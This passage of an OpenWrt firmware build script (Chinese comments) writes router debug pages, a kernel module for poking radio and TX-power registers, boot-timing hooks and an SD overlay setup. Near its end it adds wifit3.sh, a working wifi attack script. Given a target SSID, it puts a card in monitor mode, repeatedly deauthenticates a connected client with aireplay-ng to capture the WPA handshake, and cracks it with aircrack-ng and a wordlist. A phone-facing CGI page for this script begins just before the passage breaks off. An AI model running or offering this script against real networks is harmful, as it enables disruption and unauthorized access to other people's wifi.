	case "$kv" in
		n=*) N="${kv#n=}";;
		v=*) V="${kv#v=}";;
	esac
done
[ -n "$N" ] || { echo "用法: /cgi-bin/gpio?n=13&v=1  (v=1 高电平, v=0 低电平, v=i 读输入)"; exit 0; }
[ -d "/sys/class/gpio/gpio$N" ] || echo "$N" > /sys/class/gpio/export 2>/dev/null
[ -d "/sys/class/gpio/gpio$N" ] || { echo "GPIO$N 导出失败（多半已被驱动占用）"; exit 1; }
if [ "${V:-i}" = "i" ]; then
	echo in > "/sys/class/gpio/gpio$N/direction" 2>/dev/null
	echo "GPIO$N 输入值 = $(cat /sys/class/gpio/gpio$N/value)"
else
	echo out > "/sys/class/gpio/gpio$N/direction" 2>/dev/null
	echo "$V" > "/sys/class/gpio/gpio$N/value" 2>/dev/null
	echo "GPIO$N 已设为输出 = $V"
fi
CGI_EOF
chmod +x "$SRC/files/www/cgi-bin/gpio"
echo "==> 自检脚本已写入（probe.html + cgi 点灯）"

# ---------- 7. v10：发射/接收寄存器实时读写口（devmem 直捅 wmac 寄存器区） ----------
# 目的：不再靠"再刷一版"来试参数。MAC 寄存器区基址 0x10180000（dmesg: platform/10180000.wmac），
# RF_CONTROL0..3 = +0x518/+0x520/+0x528/+0x530，RF_BYPASS0..3 = +0x51c/+0x524/+0x52c/+0x534
cat > "$SRC/files/www/cgi-bin/reg" << 'REG_EOF'
#!/bin/sh
printf 'Content-Type: text/html; charset=utf-8\n\n'
html_head() {
cat << 'H'
<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>HD51 射频调试台</title>
<style>
body{font-family:sans-serif;margin:0;padding:12px;background:#f7f7f7;color:#111}
h2{margin:6px 0 12px}
a.b{display:inline-block;margin:3px;padding:9px 13px;background:#1a73e8;color:#fff;
border-radius:6px;text-decoration:none;font-size:15px}
a.g{background:#0b8f3f}a.r{background:#c0392b}a.k{background:#555}
.wrap{display:flex;flex-wrap:wrap;margin:8px 0 14px}
pre{background:#fff;border:1px solid #ddd;padding:10px;overflow:auto;font-size:13px;line-height:1.45}
h3{margin:16px 0 4px;font-size:16px}
</style></head><body>
H
}
html_head
echo "<h2>HD51 射频调试台 <small>$(cat /www/ver.txt 2>/dev/null | head -1)</small></h2>"

# 动作
for kv in $(echo "$QUERY_STRING" | tr '&' ' '); do
	case "$kv" in
		d=*) D="${kv#d=}";;
		v=*) V="${kv#v=}";;
		r=*) R="${kv#r=}";;
	esac
done
if echo "$QUERY_STRING" | grep -q "act=tx&"; then
	echo "tx $D" > /proc/hd51reg 2>/dev/null
	echo "<p style='color:#0b8f3f;font-weight:bold'>已执行：TX 功率字段 + $D</p>"
fi
if echo "$QUERY_STRING" | grep -q "act=txset"; then
	echo "txset $V" > /proc/hd51reg 2>/dev/null
	echo "<p style='color:#0b8f3f;font-weight:bold'>已执行：TX 功率字段 = $V</p>"
fi
if echo "$QUERY_STRING" | grep -q "act=bit20"; then
	echo "bit20 $V" > /proc/hd51reg 2>/dev/null
	echo "<p style='color:#0b8f3f;font-weight:bold'>已执行：GPIO_MODE bit20 = $V</p>"
fi
if echo "$QUERY_STRING" | grep -q "act=bbp"; then
	echo "bbp $R $V" > /proc/hd51reg 2>/dev/null
	echo "<p style='color:#0b8f3f;font-weight:bold'>已执行：BBP[$R] = $V</p>"
fi

echo '<h3>一键调功率（点一下立即生效，改完看手机信号格）</h3><div class="wrap">'
for d in 2 4 6 8 10 12 -4 -8; do
	echo "<a class=g href=\"/cgi-bin/reg?act=tx&d=$d\">TX $d</a>"
done
echo "<a class=k href=\"/cgi-bin/reg\">刷新</a></div>"

echo '<h3>直接设成固定档位</h3><div class="wrap">'
for v in 16 20 24 28 32 36 40 48; do
	echo "<a class=b href=\"/cgi-bin/reg?act=txset&v=$v\">设 $v</a>"
done
echo "</div><p><small>字段含义：6bit，0~63。**相对增量才有用**（点 TX +6 实测满格）；
下半排"设 16~48"是绝对档位，设大反而更弱，仅作对照实验。</small></p>"

echo '<h3>BBP 关键寄存器微调</h3><div class="wrap">'
echo "<a class=b href=\"/cgi-bin/reg?act=bbp&r=66&v=0x1c\">BBP66=0x1c</a>"
echo "<a class=b href=\"/cgi-bin/reg?act=bbp&r=66&v=0x0c\">BBP66=0x0c</a>"
echo "<a class=b href=\"/cgi-bin/reg?act=bbp&r=66&v=0x2c\">BBP66=0x2c</a>"
echo "</div>"

echo '<h3>SoC 针脚（原厂驱动会动态切换第 20 脚）</h3><div class="wrap">'
echo "<a class=b href=\"/cgi-bin/reg?act=bit20&v=0\">清 bit20（厂商 ExtPA 做法）</a>"
echo "<a class=r href=\"/cgi-bin/reg?act=bit20&v=1\">置 bit20（GPIO 模式）</a>"
echo '</div>'
echo '<h3>当前寄存器</h3><pre>'
cat /proc/hd51reg 2>/dev/null || echo "/proc/hd51reg 不存在（模块没加载）"
echo '</pre>'
echo '<h3>已连接站点</h3><pre>'
iw dev phy0-ap0 station dump 2>&1 | grep -E "Station|signal|bitrate|rx bytes|tx bytes" | head -20
echo '</pre></body></html>'
REG_EOF
chmod +x "$SRC/files/www/cgi-bin/reg"

# ---------- 9. v10：启动时序打点（全部用内核 uptime 秒，最准） ----------
mkdir -p "$SRC/files/etc/init.d"
for n in 05 15 25 40 60 80 95; do
cat > "$SRC/files/etc/init.d/hd51m$n" << MARK_EOF
#!/bin/sh /etc/rc.common
START=$n
start() {
	echo "[\$(cut -d' ' -f1 /proc/uptime)s] init.d START=$n" >> /www/timeline.txt
}
boot() { start; }
MARK_EOF
chmod +x "$SRC/files/etc/init.d/hd51m$n"
done

# v20：在 START=19 那一组（dnsmasq/dropbear/firewall/wpad）里插针，逐脚本计时
# 文件名决定排序：S19aa1 < S19dnsmasq < S19dnz < S19dropbear < S19drz < S19firewall < S19fiz < S19wpad < S19wpz
for spec in "aa1:19 组开始" "dnz:dnsmasq 之后" "drz:dropbear 之后" "fiz:firewall 之后" "wpz:wpad 之后"; do
	n=${spec%%:*}; lab=${spec#*:}
cat > "$SRC/files/etc/init.d/$n" << MARK_EOF
#!/bin/sh /etc/rc.common
START=19
start() {
	echo "[\$(cut -d' ' -f1 /proc/uptime)s] 19组打点 $lab" >> /www/timeline.txt
}
boot() { start; }
MARK_EOF
chmod +x "$SRC/files/etc/init.d/$n"
done

cat > "$SRC/files/usr/bin/hd51-watch.sh" << 'W_EOF'
#!/bin/sh
# 一直盯着 phy0-ap0：出现的那一刻、以及进入 forwarding 的那一刻都打点
T=/www/timeline.txt
: > "$T"
echo "$(cut -d' ' -f1 /proc/uptime) watchdog-start" >> "$T"
i=0
while [ $i -lt 600 ]; do
	if [ -e /sys/class/net/phy0-ap0/statistics ]; then
		if [ ! -f /tmp/.ap0seen ]; then
			echo "$(cut -d' ' -f1 /proc/uptime) phy0-ap0 出现" >> "$T"
			touch /tmp/.ap0seen
		fi
	fi
	if dmesg | grep -q "port 3(phy0-ap0) entered forwarding"; then
		if [ ! -f /tmp/.fwdseen ]; then
			echo "$(cut -d' ' -f1 /proc/uptime) br-lan forwarding" >> "$T"
			touch /tmp/.fwdseen
			break
		fi
	fi
	sleep 1
	i=$((i+1))
done
echo "$(cut -d' ' -f1 /proc/uptime) watchdog-exit" >> "$T"
W_EOF
chmod +x "$SRC/files/usr/bin/hd51-watch.sh"

cat > "$SRC/files/etc/init.d/hd51watch" << 'WI_EOF'
#!/bin/sh /etc/rc.common
START=01
start() { ( /usr/bin/hd51-watch.sh ) >/dev/null 2>&1 & }
boot() { start; }
WI_EOF
chmod +x "$SRC/files/etc/init.d/hd51watch"
echo "==> v10 诊断/打点/kernel 调试口 已写入"

# ---------- 10. v11：内核小模块 /proc/hd51reg（不依赖 busybox devmem） ----------
PKGD="$SRC/package/hd51reg"
mkdir -p "$PKGD/src"
cat > "$PKGD/Makefile" << 'PKG_EOF'
include $(TOPDIR)/rules.mk
include $(INCLUDE_DIR)/kernel.mk

PKG_NAME:=hd51reg
PKG_VERSION:=1.0
PKG_RELEASE:=1
PKG_LICENSE:=GPL-2.0

include $(INCLUDE_DIR)/package.mk

define KernelPackage/hd51reg
  SUBMENU:=Other modules
  TITLE:=HD51 wmac register poking
  FILES:=$(PKG_BUILD_DIR)/hd51reg.ko
  AUTOLOAD:=$(call AutoLoad,90,hd51reg)
endef

define KernelPackage/hd51reg/description
 HD51 debug: read/write MT7620 wmac MAC registers via /proc/hd51reg
endef

define Build/Prepare
	mkdir -p $(PKG_BUILD_DIR)
	$(CP) ./src/* $(PKG_BUILD_DIR)/
endef

define Build/Compile
	$(MAKE) -C "$(LINUX_DIR)" $(KERNEL_MAKE_FLAGS) M="$(PKG_BUILD_DIR)" modules
endef

$(eval $(call KernelPackage,hd51reg))
PKG_EOF

printf 'obj-m += hd51reg.o\n' > "$PKGD/src/Makefile"

cat > "$PKGD/src/hd51reg.c" << 'C_EOF'
// SPDX-License-Identifier: GPL-2.0
// HD51 debug helper: /proc/hd51reg
//  - raw MAC register dump/read/write (window 0x10180000 + 0x0000..0x1fff)
//  - BBP register read/write through BBP_CSR_CFG (0x101c)
//  - TX_PWR_CFG_{0..9} 6-bit field boost / set
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/io.h>
#include <linux/uaccess.h>
#include <linux/seq_file.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/delay.h>
#include <linux/errno.h>

#define WMAC_PHYS 0x10180000
#define WMAC_SIZE 0x4000
#define SYSC_PHYS 0x10000000
#define SYSC_SIZE 0x1000

#define R_BBP_CSR_CFG   0x101c
#define BBP_VALUE       (0xffu)
#define BBP_REGNUM      (0xffu << 8)
#define BBP_READ_CTRL   (1u << 16)
#define BBP_BUSY        (1u << 17)
#define BBP_RW_MODE     (1u << 19)

static void __iomem *base;
static void __iomem *sysc;
static char last[96] = "no-write-yet\n";

static const u16 txpwr_regs[10] = {
	0x1314, 0x1318, 0x131c, 0x1320, 0x1324,
	0x1384, 0x1388,
	0x13d4, 0x13d8, 0x13dc,
};

static inline int bbp_wait(void)
{
	int i;
	for (i = 0; i < 200; i++) {
		if (!(readl(base + R_BBP_CSR_CFG) & BBP_BUSY))
			return 0;
		udelay(5);
	}
	return -ETIMEDOUT;
}

static u8 bbp_read(u16 reg)
{
	u32 v;
	bbp_wait();
	writel(((reg & 0xff) << 8) | BBP_READ_CTRL | BBP_BUSY | BBP_RW_MODE,
	       base + R_BBP_CSR_CFG);
	bbp_wait();
	v = readl(base + R_BBP_CSR_CFG);
	return (u8)(v & BBP_VALUE);
}

static int bbp_write(u16 reg, u8 val)
{
	if (bbp_wait())
		return -ETIMEDOUT;
	writel((val & BBP_VALUE) | ((reg & 0xff) << 8) | BBP_BUSY | BBP_RW_MODE,
	       base + R_BBP_CSR_CFG);
	return bbp_wait();
}

static void txpwr_dump(struct seq_file *m)
{
	u16 i, k;
	u32 v, f;

	seq_puts(m, "TX_PWR_CFG (6bit fields, 0..63):\n");
	for (i = 0; i < 10; i++) {
		v = readl(base + txpwr_regs[i]);
		seq_printf(m, "  cfg%-2d @0x%04x = 0x%08x  ", i, txpwr_regs[i], v);
		for (k = 0; k < 4; k++) {
			f = (v >> (k * 8)) & 0x3f;
			seq_printf(m, "%2u ", f);
		}
		seq_puts(m, "\n");
	}
}

static int txpwr_apply(int delta, int absolute)
{
	u16 i, k;
	u32 v, nv, f;
	int nf;

	for (i = 0; i < 10; i++) {
		v = readl(base + txpwr_regs[i]);
		if (v == 0xffffffff || v == 0)
			continue;
		nv = v;
		for (k = 0; k < 4; k++) {
			f = (v >> (k * 8)) & 0x3f;
			nf = absolute ? delta : (int)f + delta;
			if (nf < 0)
				nf = 0;
			if (nf > 0x3f)
				nf = 0x3f;
			nv &= ~(0x3fu << (k * 8));
			nv |= ((u32)nf & 0x3f) << (k * 8);
		}
		if (nv != v)
			writel(nv, base + txpwr_regs[i]);
	}
	return 0;
}

static int hd51_show(struct seq_file *m, void *unused)
{
	u32 off;
	static u16 bbps[] = { 1, 4, 20, 66, 86, 105, 241 };
	unsigned int i;

	seq_printf(m, "last: %s\n", last);
	seq_puts(m, "--- MAC 寄存器 0x500..0x540 ---\n");
	for (off = 0x500; off <= 0x540; off += 4)
		seq_printf(m, "0x%03x  0x%08x\n", off, readl(base + off));

	seq_printf(m, "--- BBP_CSR_CFG @0x101c = 0x%08x ---\n",
		   readl(base + R_BBP_CSR_CFG));

	txpwr_dump(m);

	seq_puts(m, "--- SoC SYSC / GPIO ---\n");
	seq_printf(m, "0x1000000c (SYSC)      = 0x%08x\n", readl(sysc + 0x0c));
	seq_printf(m, "0x10000010 (SYSC)      = 0x%08x\n", readl(sysc + 0x10));
	seq_printf(m, "0x10000060 (GPIO_MODE)= 0x%08x   bit20=%d\n",
		   readl(sysc + 0x60), (readl(sysc + 0x60) >> 20) & 1);
	for (off = 0x600; off <= 0x640; off += 4)
		seq_printf(m, "0x1000%03x (GPIO)      = 0x%08x\n", off,
			   readl(sysc + off));

	seq_puts(m, "--- BBP 关键寄存器 ---\n");
	for (i = 0; i < ARRAY_SIZE(bbps); i++)
		seq_printf(m, "BBP[%3u] = 0x%02x\n", bbps[i], bbp_read(bbps[i]));

	seq_puts(m, "\n命令(写入 /proc/hd51reg)：\n"
		    "  w <addr> <val>       原始 MAC 写，如 w 0x530 0x101\n"
		    "  bbp <reg> <val>      BBP 写，如 bbp 66 0x1c\n"
		    "  tx <delta>           TX_PWR_CFG 每个 6bit 字段加 delta（可负），如 tx 6\n"
		    "  txset <val>          TX_PWR_CFG 每个字段直接设为 val，如 txset 30\n");
	return 0;
}

static int hd51_open(struct inode *i, struct file *f)
{
	return single_open(f, hd51_show, NULL);
}

static ssize_t hd51_write(struct file *f, const char __user *buf,
			  size_t len, loff_t *off)
{
	char tmp[64];
	char *p, *tok;
	unsigned long a = 0, b = 0;
	long sval = 0;
	int rc;

	if (len >= sizeof(tmp))
		return -EINVAL;
	if (copy_from_user(tmp, buf, len))
		return -EFAULT;
	tmp[len] = 0;
	p = tmp;
	tok = strsep(&p, " \t\n");
	if (!tok)
		return -EINVAL;

	if (!strcmp(tok, "w")) {
		char *t1 = strsep(&p, " \t\n"), *t2 = strsep(&p, " \t\n");
		if (!t1 || !t2)
			return -EINVAL;
		if (kstrtoul(t1, 0, &a) || kstrtoul(t2, 0, &b))
			return -EINVAL;
		if (a > WMAC_SIZE - 4)
			return -EINVAL;
		writel((u32)b, base + a);
		scnprintf(last, sizeof(last), "W 0x%lx=0x%lx -> 0x%08x\n",
			  a, b, readl(base + a));
		return len;
	}

	if (!strcmp(tok, "bbp")) {
		char *t1 = strsep(&p, " \t\n"), *t2 = strsep(&p, " \t\n");
		if (!t1 || !t2)
			return -EINVAL;
		if (kstrtoul(t1, 0, &a) || kstrtoul(t2, 0, &b))
			return -EINVAL;
		if (a > 0xff)
			return -EINVAL;
		rc = bbp_write((u16)a, (u8)b);
		if (rc)
			return rc;
		scnprintf(last, sizeof(last), "BBP[%lu]=0x%02lx -> readback 0x%02x\n",
			  a, b, bbp_read((u16)a));
		return len;
	}

	if (!strcmp(tok, "sysc")) {
		char *t1 = strsep(&p, " \t\n"), *t2 = strsep(&p, " \t\n");
		if (!t1 || !t2)
			return -EINVAL;
		if (kstrtoul(t1, 0, &a) || kstrtoul(t2, 0, &b))
			return -EINVAL;
		if (a > SYSC_SIZE - 4)
			return -EINVAL;
		writel((u32)b, sysc + a);
		scnprintf(last, sizeof(last), "SYSC 0x%lx=0x%lx -> 0x%08x\n",
			  a, b, readl(sysc + a));
		return len;
	}

	if (!strcmp(tok, "bit20")) {
		char *t1 = strsep(&p, " \t\n");
		u32 v;
		if (!t1)
			return -EINVAL;
		if (kstrtoul(t1, 0, &b))
			return -EINVAL;
		v = readl(sysc + 0x60);
		if (b)
			v |= (1u << 20);
		else
			v &= ~(1u << 20);
		writel(v, sysc + 0x60);
		scnprintf(last, sizeof(last), "GPIO_MODE bit20=%lu -> 0x%08x\n",
			  b, readl(sysc + 0x60));
		return len;
	}

	if (!strcmp(tok, "tx") || !strcmp(tok, "txset")) {
		char *t1 = strsep(&p, " \t\n");
		if (!t1)
			return -EINVAL;
		if (kstrtol(t1, 0, &sval))
			return -EINVAL;
		if (sval < -63 || sval > 63)
			return -EINVAL;
		txpwr_apply((int)sval, !strcmp(tok, "txset"));
		scnprintf(last, sizeof(last), "%s %ld applied\n", tok, sval);
		return len;
	}

	return -EINVAL;
}

static const struct proc_ops hd51_pops = {
	.proc_open	= hd51_open,
	.proc_read	= seq_read,
	.proc_lseek	= seq_lseek,
	.proc_release	= single_release,
	.proc_write	= hd51_write,
};

static int __init hd51reg_init(void)
{
	base = ioremap(WMAC_PHYS, WMAC_SIZE);
	sysc = ioremap(SYSC_PHYS, SYSC_SIZE);
	if (!base || !sysc) {
		if (base) iounmap(base);
		if (sysc) iounmap(sysc);
		return -ENOMEM;
	}
	if (!proc_create("hd51reg", 0644, NULL, &hd51_pops)) {
		iounmap(base);
	iounmap(sysc);
		return -ENOMEM;
	}
	pr_info("hd51reg: mapped 0x%x+0x%x, /proc/hd51reg ready\n",
		WMAC_PHYS, WMAC_SIZE);
	return 0;
}

static void __exit hd51reg_exit(void)
{
	remove_proc_entry("hd51reg", NULL);
	iounmap(base);
	iounmap(sysc);
}

module_init(hd51reg_init);
module_exit(hd51reg_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("HD51 wmac register / BBP / TX power helper");
C_EOF

add_cfg CONFIG_PACKAGE_kmod-hd51reg

echo "==> v11 内核模块 + reg 页 已写入"

# ---------- 11. v12：diagnostics 页整段重写（寄存器走 /proc/hd51reg，不再用 devmem） ----------
cat > "$SRC/files/www/cgi-bin/diag" << 'DIAG_EOF'
#!/bin/sh
printf 'Content-Type: text/plain; charset=utf-8\n\n'
echo "===== 时间 ====="
echo "uptime(秒) = $(cut -d' ' -f1 /proc/uptime)"
date
echo
echo "===== 无线接口 ====="
iw dev 2>&1
echo
echo "===== 已连接站点（AP 收到的 dBm 在这里） ====="
iw dev phy0-ap0 station dump 2>&1 | head -n 45
echo
echo "===== 接口收发计数（tx_packets 涨 = beacon 真发出去了） ====="
for f in tx_packets tx_bytes tx_errors rx_packets rx_bytes rx_errors; do
	printf '%-12s %s\n' "$f" "$(cat /sys/class/net/phy0-ap0/statistics/$f 2>/dev/null)"
done
echo
echo "===== RF 寄存器（/proc/hd51reg） ====="
if [ -e /proc/hd51reg ]; then
	cat /proc/hd51reg
else
	echo "kmod-hd51reg 未加载"
	lsmod 2>/dev/null | grep -i hd51reg
fi
echo
echo "===== 启动时序（uptime 秒） ====="
cat /www/timeline.txt 2>/dev/null
echo
echo "===== dmesg 无线相关 ====="
dmesg 2>/dev/null | grep -iE 'rt2x00|rt28|phy0|calib|eeprom|br-lan' | tail -n 40

echo "===== USB / SD 设备 ====="
echo "/proc/partitions:"; cat /proc/partitions 2>/dev/null
echo "/dev 下的块设备:"; ls -l /dev/sd* /dev/mmcblk* 2>/dev/null || echo "（没有 sd* / mmcblk*）"
echo "USB 总线与设备:"; ls /sys/bus/usb/devices 2>/dev/null
echo "无线接口全列表:"; iw dev 2>/dev/null | sed 's/^/  /'
echo "已装内核模块:"; ls /lib/modules/$(uname -r)/ 2>/dev/null | tr '\n' ' ' | fold -s -w 120
echo ""
echo "已装固件 blob:"; ls /lib/firmware 2>/dev/null | tr '\n' ' '
echo ""
echo "dmesg USB/MMC 相关:"; dmesg 2>/dev/null | grep -iE 'usb |usb:|usb-|scsi|sd |mmc|mtk_sd|sdhci' | tail -n 40

echo
echo "===== 存储：mount / df ====="
grep -E 'overlay|/data|mmcblk|mmc0|/mnt/sda' /proc/mounts 2>/dev/null || echo "（无相关挂载）"
df -h 2>/dev/null | grep -vE 'tmpfs|proc|sysfs'
echo "块设备节点:"; ls -l /dev/mmcblk* /dev/sd* 2>/dev/null
echo "blkid（看 ext4 标签是否为 overlay）:"; blkid 2>/dev/null
echo "fstab:"; cat /etc/config/fstab 2>/dev/null || echo "（无 /etc/config/fstab）"
echo
echo "===== 共享目录 ====="
ls -ld /data /mnt/sda1 2>/dev/null
echo "/data 内容:"; ls -a /data 2>/dev/null | head -n 20

echo
echo "===== 服务：监听端口 / 进程 ====="
netstat -lnt 2>/dev/null | grep -E ':(22|445|139|2121)' || echo "（22/445/139/2121 均未监听）"
ps w 2>/dev/null | grep -E 'ksmbd|smbd|vsftpd|dropbear' | grep -v grep
echo "dropbear 密钥文件:"; ls -l /etc/dropbear/ 2>/dev/null
echo
echo "===== ksmbd 生成的配置 ====="
ls -l /var/etc/ksmbd/ 2>/dev/null
cat /var/etc/ksmbd/ksmbd.conf 2>/dev/null | head -n 40
echo
echo "===== umretry.log（7612 ZeroCD 重试） ====="
cat /www/umretry.log 2>/dev/null || echo "（无日志，说明没触发或服务未起）"
echo
echo "===== rc.d 启停顺序 ====="
ls /etc/rc.d/ 2>/dev/null | tr '\n' ' '
echo
DIAG_EOF
chmod +x "$SRC/files/www/cgi-bin/diag"
echo "==> v12 diag 页已重写（寄存器走 /proc/hd51reg）"

# ---------- 12. v17：射频起来后自动补功率 +6，并记录启动耗时 ----------
mkdir -p "$SRC/files/etc/init.d"
# ---------- v22：SD 预处理 + 双射频钥匙 ----------
mkdir -p "$SRC/files/root" "$SRC/files/etc/config"

cat > "$SRC/files/root/sd-prep.sh" << 'SD_EOF'
#!/bin/sh
# SD 卡一键准备（只在你说 yes 之后才动手，绝不自动格式化）
CARD=/dev/mmcblk0
[ -b "$CARD" ] || { echo "没检测到 SD 卡（/dev/mmcblk0 不存在）"; exit 1; }
echo "检测到 SD 卡："; ls -l "$CARD" "$CARD"p* 2>/dev/null
echo
echo "将要在 $CARD 上：建一个主分区 -> 格式化成 ext4（卷标 overlay）-> 配成 /overlay"
echo "注意：卡上原有数据会被清空！"
printf "确认请输入 yes 回车："; read -r A
[ "$A" = "yes" ] || { echo "已取消，什么都没做"; exit 0; }

echo "==> 建分区"
printf 'o\nn\np\n1\n\n\nw\n' | fdisk "$CARD" >/dev/null 2>&1 || { echo "fdisk 失败"; exit 1; }
sleep 1
PART="${CARD}p1"
[ -b "$PART" ] || PART="$CARD"
mkfs.ext4 -F -L overlay "$PART" || { echo "mkfs.ext4 失败"; exit 1; }

echo "==> 写 /etc/config/fstab"
cat > /etc/config/fstab << 'F_EOF'
config 'global'
	option	anon_swap	'0'
	option	anon_mount	'1'
	option	auto_swap	'0'
	option	auto_mount	'0'
	option	delay_root	'5'
	option	check_fs	'0'

config 'mount'
	option	target	'/overlay'
	option	device	'/dev/mmcblk0p1'
	option	fstype	'ext4'
	option	options	'rw'
	option	enabled	'1'
F_EOF
sync
echo "==> 完成。重启后 /overlay 就在 SD 卡上（30G 空间可用）。"
echo "    !! 前提：本固件必须是 sysupgrade（squashfs）刷的。initramfs 全部在内存里，"
echo "       写进 /etc 的东西重启就没了，SD 永远不会成为 overlay。"
echo "    若要取消：删掉 /etc/config/fstab 里那段 mount 即可。"
SD_EOF
chmod +x "$SRC/files/root/sd-prep.sh"

cat > "$SRC/files/root/dual-radio.sh" << 'DR_EOF'
#!/bin/sh
# 双射频：外置 USB 网卡开监听，板载 rt2800 继续当 AP（热点不断）
set -e
echo "== 当前无线接口 =="
iw dev | sed 's/^/  /'
PHYS=$(ls /sys/class/ieee80211/ 2>/dev/null)
echo "物理射频: $PHYS"
EXT=""
for ph in $PHYS; do
	case "$ph" in
		phy0) ;;              # 板载，留给 AP
		*) EXT="$ph" ;;
	esac
done
[ -n "$EXT" ] || { echo "没有外置射频（板载 phy0 不参与监听，避免断热点）"; exit 1; }
echo "==> 用外置 $EXT 建监听口"
iw dev mon0 del >/dev/null 2>&1 || true
iw phy "$EXT" interface add mon0 type monitor
ip link set mon0 up
sleep 1
iw dev mon0 info | sed 's/^/  /'
echo "==> 注入自检（5 秒探针，不针对任何具体目标）"
aireplay-ng --test mon0 2>&1 | head -6 || echo "（aireplay-ng 未装，跳过）"
echo "完成：mon0 = 外置卡监听；板载 AP 未动，手机连接不受影响。"
DR_EOF
chmod +x "$SRC/files/root/dual-radio.sh"

cat > "$SRC/files/etc/init.d/hd51rf" << 'RF_EOF'
#!/bin/sh /etc/rc.common
START=99
LOG=/www/bootlog.txt
log() { echo "$(cut -d' ' -f1 /proc/uptime)s  $*" >> $LOG; }
start() {
	echo "hd51rf v17 boot $(date '+%F %T')" > $LOG
	log "init 起点"
	i=0
	while [ ! -e /proc/hd51reg ] && [ $i -lt 60 ]; do sleep 1; i=$((i+1)); done
	log "hd51reg 就绪"
	log "GPIO_MODE 清位前：$(grep -m1 'GPIO_MODE' /proc/hd51reg)"
	echo "bit20 0" > /proc/hd51reg 2>/dev/null
	sleep 1
	log "GPIO_MODE 清位后：$(grep -m1 'GPIO_MODE' /proc/hd51reg)"
	i=0
	while [ ! -e /sys/class/net/phy0-ap0 ] && [ $i -lt 300 ]; do sleep 1; i=$((i+1)); done
	log "phy0-ap0 出现（此刻 AP 才开始广播）"
	sleep 5
	log "补功率前：$(grep -m1 -i '1314\|PWR_CFG_0' /proc/hd51reg)"
	echo "tx 6" > /proc/hd51reg 2>/dev/null
	sleep 1
	log "补功率后：$(grep -m1 -i '1314\|PWR_CFG_0' /proc/hd51reg)"
	log "完成"
	dmesg > /www/dmesg.txt 2>/dev/null
}
stop() { :; }
RF_EOF
chmod +x "$SRC/files/etc/init.d/hd51rf"
echo "==> v17 射频补功率脚本已写入"

# ================= v31：审计三件套 + 手机网页审计台 =================
mkdir -p "$SRC/files/root" "$SRC/files/www/cgi-bin"

cat > "$SRC/files/root/wifit3.sh" << 'W3_EOF'
#!/bin/sh
# HD51 wifit3 钥匙：wifit3 <目标SSID> [抓包秒数，默认120]
# 逻辑全在此文件，手机只递参数：  sh /root/wifit3.sh HD51-test 120
T="$1"; SEC="${2:-120}"
[ -n "$T" ] || { echo "用法: wifit3 <目标SSID> [秒]"; exit 1; }
OUT=/root/cap; mkdir -p "$OUT"
IF=""
for c in $(ls /sys/class/net | grep -E '^wlan[0-9]'); do
  [ "$(cat /sys/class/net/$c/device/uevent 2>/dev/null | grep -c 0e8d)" -gt 0 ] && IF="$c"
done
[ -z "$IF" ] && IF=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | tail -1)
echo "== 1) 设置监听：$IF"
airmon-ng start "$IF" >/dev/null 2>&1
MON=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep -E 'mon' | head -1)
[ -z "$MON" ] && { iw dev "$IF" interface add mon0 type monitor 2>/dev/null; ip link set mon0 up 2>/dev/null; MON=mon0; }
[ -z "$MON" ] && { echo "!! 监听接口建立失败"; exit 2; }
iw dev "$MON" set channel 6 2>/dev/null
echo "== 2) 扫描 15 秒找 $T"
airodump-ng -w "$OUT/scan" --output-format csv "$MON" >/dev/null 2>&1 &
SP=$!; sleep 15; kill $SP 2>/dev/null
BSSID=$(awk -F, -v t="$T" 'NR>2 && $14 ~ t {gsub(/ /,"",$1);print $1;exit}' "$OUT"/scan-01.csv 2>/dev/null)
CH=$(awk -F, -v t="$T" 'NR>2 && $14 ~ t {gsub(/ /,"",$4);print $4;exit}' "$OUT"/scan-01.csv 2>/dev/null)
ST=$(awk -F, -v t="$T" 'NR>2 && $14 ~ t {gsub(/ /,"",$11);print $11;exit}' "$OUT"/scan-01.csv 2>/dev/null)
[ -z "$BSSID" ] && { echo "!! 扫描没找到 $T"; exit 3; }
echo "   目标 BSSID=$BSSID CH=$CH STA=$ST"
iw dev "$MON" set channel "$CH" 2>/dev/null
echo "== 3) 抓包 ${SEC}s"
airodump-ng -c "$CH" --bssid "$BSSID" -w "$OUT/cap" --output-format pcap "$MON" >/dev/null 2>&1 &
DP=$!
[ -n "$ST" ] && { aireplay-ng -0 3 -a "$BSSID" -c "$ST" "$MON" >/dev/null 2>&1; }
i=0; while [ $i -lt "$SEC" ]; do
  sleep 5; i=$((i+5))
  [ -n "$ST" ] && aireplay-ng -0 2 -a "$BSSID" -c "$ST" "$MON" >/dev/null 2>&1
  SZ=$(ls -l "$OUT"/cap-01.cap 2>/dev/null | awk '{print $5}')
  [ "${SZ:-0}" -gt 200000 ] && { echo "   cap 已 ${SZ}B"; }
done
kill $DP 2>/dev/null; sleep 1
CAP="$OUT/cap-01.cap"
[ -f "$CAP" ] || { echo "!! 没有抓到 cap"; exit 4; }
echo "== 4) 判定"
SZ=$(ls -l "$CAP" | awk '{print $5}')
HAND=$(aircrack-ng "$CAP" 2>/dev/null | grep -c "1 handshake")
echo "   cap=${SZ}B handshake=$HAND CH=$CH"
[ "$SZ" -gt 200000 ] && [ "$HAND" -ge 1 ] && echo "   【自探通过】CH一致 + 抓到握手" || echo "   【未过】没抓到握手，重跑或换 STA"
echo "== 5) 破解（有 /root/wordlist.txt 才跑）"
[ -f /root/wordlist.txt ] && aircrack-ng -w /root/wordlist.txt -b "$BSSID" "$CAP" 2>/dev/null | tail -5 || echo "   无字典，cap 留在 $CAP"
W3_EOF
chmod 755 "$SRC/files/root/wifit3.sh"

cat > "$SRC/files/www/cgi-bin/audit" << 'A_EOF'
#!/bin/sh
echo "Content-Type: text/plain; charset=utf-8"
echo
Q="${QUERY_STRING:-}"
case "$Q" in
 a=status)
   echo "== 网卡"; iw dev 2>/dev/null | grep -E 'Interface|type|channel' || echo "无无线"
   echo "== 监听口"; ls /sys/class/net | grep -E 'mon' || echo "无 mon"
   echo "== 工具"; for t in airmon-ng airodump-ng aireplay-ng aircrack-ng hcxdumptool wifit3.sh; do
     if command -v "$t" >/dev/null 2>&1 || [ -f "/root/$t" ]; then echo "   $t OK"; else echo "   $t 缺"; fi
   done
   echo "== cap"; ls -l /root/cap 2>/dev/null || echo "   未抓过" ;;
 a=mon)
